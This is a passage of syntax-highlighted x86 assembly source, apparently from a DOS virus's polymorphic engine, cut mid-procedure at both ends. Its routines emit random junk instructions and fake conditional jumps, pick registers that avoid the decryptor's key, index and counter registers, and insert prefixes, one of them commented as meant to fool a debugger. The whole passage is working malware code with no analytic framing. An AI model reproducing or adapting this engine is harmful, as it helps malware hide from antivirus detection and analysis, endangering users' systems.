                        </span><span class="sc1">; JMP (or JCXZ or Jxx)</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; Save DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temporal</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Put JMP address on DI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; Decrement DI to get displacement</span><span class="sc0">
                        </span><span class="sc1">; zone on instruction</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">               </span><span class="sc1">; Put displacement</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">      </span><span class="sc1">; Restore DI</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Fin3</span><span class="sc0">        </span><span class="sc1">; Jump and finish</span><span class="sc0">
      </span><span class="sc5">@@Fin2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; Do I do a faked conditional jump?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Fin3</span><span class="sc0">        </span><span class="sc1">; With a 25% of probability, say "NO"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">      </span><span class="sc1">; Get a number 1, 2 or 3</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin3</span><span class="sc0">        </span><span class="sc1">; Finish if 0</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">      </span><span class="sc1">; Test resultant AL</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@ConSTC</span><span class="sc0">      </span><span class="sc1">; If AL=1, jump here</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ConZF</span><span class="sc0">       </span><span class="sc1">; If AL=2, jump here</span><span class="sc0">
</span><span class="sc1">;; Construct CLC/JC or CLC/JNC</span><span class="sc0">
  </span><span class="sc5">@@ConCLC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">    </span><span class="sc1">; Insert "CLC"</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">       </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ConCLC2</span><span class="sc0">     </span><span class="sc1">; Jump here, then (if ZF set)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">72h</span><span class="sc0">     </span><span class="sc1">; "JC" with random displacement (it</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; never jumps)</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Fin3</span><span class="sc0">        </span><span class="sc1">; Jump and end</span><span class="sc0">
  </span><span class="sc5">@@ConCLC2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get an aleatory in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">      </span><span class="sc1">; Get a non-zero AH</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ConCLC2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">     </span><span class="sc1">; Store a "JNC" with AH displacement</span><span class="sc0">
    </span><span class="sc5">@@Repite</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; JNC always jumps</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">      </span><span class="sc1">; Insert AH random bytes</span><span class="sc0">
      </span><span class="sc5">@@Otro</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Otro</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Fin3</span><span class="sc0">        </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">;; Construct STC/JNC or STC/JC</span><span class="sc0">
  </span><span class="sc5">@@ConSTC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc0">      </span><span class="sc1">; Insert STC</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ConSTC2</span><span class="sc0">       </span><span class="sc1">; If ZF, jump to STC/JC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">       </span><span class="sc1">; Put a "JNC" with random displacement</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Fin3</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
  </span><span class="sc5">@@ConSTC2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">;Get a non-zero displacement for the "JC"</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ConSTC2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">72h</span><span class="sc0">       </span><span class="sc1">; Put "JC" opcode in AL</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Repite</span><span class="sc0">        </span><span class="sc1">; Jump and do the same that "@@ConCLC"</span><span class="sc0">
</span><span class="sc1">;; Construct CMP Reg,Reg/JNZ or CMP Reg,Reg/JZ ("Reg" must be the same)</span><span class="sc0">
  </span><span class="sc5">@@ConZF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">        </span><span class="sc1">; Put AH (aleatory) in AL</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Put 3 lowest bytes on the third bit po-</span><span class="sc0">
                      </span><span class="sc1">; sition</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0738h</span><span class="sc0">     </span><span class="sc1">; Leave alone this bits</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Integrate them in AL. Now bits (3,4,5)</span><span class="sc0">
                      </span><span class="sc1">; and (0,1,2) are the same</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Set register operation</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Put CMP opcode in AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Save instruction formed in AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get an aleatory in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">        </span><span class="sc1">; Get a random number between 0 and 3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Add it to main opcode to construct one</span><span class="sc0">
                      </span><span class="sc1">; of the four variations of "CMP" in this</span><span class="sc0">
                      </span><span class="sc1">; type of opcode</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Put it in AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Put it again in CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ConZF2</span><span class="sc0">        </span><span class="sc1">; Here if Zero Flag</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">       </span><span class="sc1">; Put a random "JNZ"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Fin3</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
  </span><span class="sc5">@@ConZF2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get non-zero random AH</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ConZF2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">       </span><span class="sc1">; Put "JZ" and put random bytes along the</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Repite</span><span class="sc0">        </span><span class="sc1">; displacement jumping here</span><span class="sc0">
      </span><span class="sc5">@@Fin3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Restore attributes</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to get a non-used register (the got register is lower than CL)</span><span class="sc0">
</span><span class="sc5">ObtenRegistro</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">        </span><span class="sc1">; Save BX</span><span class="sc0">
   </span><span class="sc5">@@OtraVez</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random byte in AL between 0 and 7</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">        </span><span class="sc1">; SP?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez</span><span class="sc0">       </span><span class="sc1">; Repeat, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; &gt;=CL?</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">   </span><span class="sc5">@@OtraVez</span><span class="sc0">       </span><span class="sc1">; Repeat, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Equal to key register?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez</span><span class="sc0">               </span><span class="sc1">; Repeat, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Equal to index register?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez</span><span class="sc0">           </span><span class="sc1">; Repeat, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Equal to counter register?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez</span><span class="sc0">             </span><span class="sc1">; Repeat, then</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonComoUsado</span><span class="sc0">  </span><span class="sc1">; Mark this register like used (if it</span><span class="sc0">
                      </span><span class="sc1">; has to be marked)</span><span class="sc0">
   </span><span class="sc5">@@Retorna</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">        </span><span class="sc1">; Restore BX and return</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">ObtenRegistro</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Markers of BP, SI and DI registers</span><span class="sc0">
</span><span class="sc5">RegistrosUsados</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; BP, SI, DI</span><span class="sc0">

</span><span class="sc1">;; Procedure to put BP, SI or DI like used</span><span class="sc0">
</span><span class="sc5">PonComoUsado</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">       </span><span class="sc1">; Is lower than BP?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">       </span><span class="sc1">; Then, finish</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Put register in BX (zero extended)</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc5">RegistrosUsados</span><span class="sc4">-</span><span class="sc2">205h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get direction of "used-</span><span class="sc0">
                              </span><span class="sc1">; register" mark</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Mark it</span><span class="sc0">
  </span><span class="sc5">@@Retorna</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PonComoUsado</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;; RANDOM INSTRUCTION GENERATOR</span><span class="sc0">
</span><span class="sc5">HazBasuraAleatoria2</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">        </span><span class="sc1">; Get a register lower than SP (get</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenRegistro</span><span class="sc0">     </span><span class="sc1">; AX, CX, DX or BX)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Put it in CL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get aleatory AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">        </span><span class="sc1">; Do aleatory JMP with 25% of prob.</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SaltoAleatorio</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; 25% of probability for putting a</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salxto00</span><span class="sc0">      </span><span class="sc1">; 66h opcode (it is 8 bit instruc-</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; tion yet, but not for the debug-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">       </span><span class="sc1">; ger :)    ).</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc5">@@Salxto00</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">        </span><span class="sc1">; If AL=1, then do a 1 byte instruc.</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@Instruccion1byte</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Instruccion2bytes</span><span class="sc0"> </span><span class="sc1">; If AL=2, then do a 2 byte instruc.</span><span class="sc0">

</span><span class="sc1">;; More than 2 bytes instruction</span><span class="sc0">
</span><span class="sc5">@@Instruccion3bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKDLL1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKDLL1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKDLL1</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">MeteEscritura</span><span class="sc0"> </span><span class="sc1">; Put a memory write with a 1/8 of prob.</span><span class="sc0">
    </span><span class="sc5">@@KKDLL1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Random word in AX</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">       </span><span class="sc1">; JZ with 25% of probability</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@InstruccionChunga</span><span class="sc0"> </span><span class="sc1">; Do weird instruction</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">      </span><span class="sc1">; JZ with 25% of probability</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtroTipo</span><span class="sc0">      </span><span class="sc1">; Do another type of instruction</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">        </span><span class="sc1">; Save AH</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007Fh</span><span class="sc0">     </span><span class="sc1">; Get a random number between 0 and 0Fh</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">       </span><span class="sc1">; in AL</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; CH=0 or 4</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">        </span><span class="sc1">; Add it to 8 bit register to get random-</span><span class="sc0">
                      </span><span class="sc1">; ly ?H or ?L</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">BasuraInstruc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Convert AL to opcode</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Put it in BL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get an aleatory in AL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ah</span><span class="sc0">       </span><span class="sc1">; Check if it is "CMP" opcode</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salllclx</span><span class="sc0">      </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">        </span><span class="sc1">; AL=0 or 2</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Get in AL opcode 38h or 3Ah</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
  </span><span class="sc5">@@Salllclx</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">       </span><span class="sc1">; Get AH between 0 and 7 (random)</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Put register in bits (3,4,5)</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Integrate them in the same opcode</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Byte or word extra displacement on in-</span><span class="sc0">
                      </span><span class="sc1">; dex?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SaltoCXC</span><span class="sc0">      </span><span class="sc1">; If byte, jump</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; A word will be added to index</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@SaltoCXC2</span><span class="sc0">
    </span><span class="sc5">@@SaltoCXC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; A byte will be added to index</span><span class="sc0">
   </span><span class="sc5">@@SaltoCXC2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">        </span><span class="sc1">; Store whole opcde</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; If byte...</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
